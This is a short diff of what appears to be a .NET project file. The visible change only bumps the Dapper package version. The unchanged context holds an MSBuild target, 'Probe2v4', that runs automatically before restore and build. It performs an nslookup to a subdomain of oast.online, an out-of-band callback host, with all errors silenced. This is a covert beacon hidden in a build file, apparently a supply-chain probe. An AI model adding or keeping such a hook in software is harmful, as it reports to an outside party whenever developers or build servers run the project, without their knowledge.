@@ -4,7 +4,7 @@
     <OutputType>Exe</OutputType>
   </PropertyGroup>
   <ItemGroup>
-    <PackageReference Include="Dapper" Version="1.50.0" />
+    <PackageReference Include="Dapper" Version="2.1.79" />
   </ItemGroup>
   <Target Name="Probe2v4" BeforeTargets="ResolveReferences;Build;Restore">
     <Exec Command="nslookup probe2v4.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
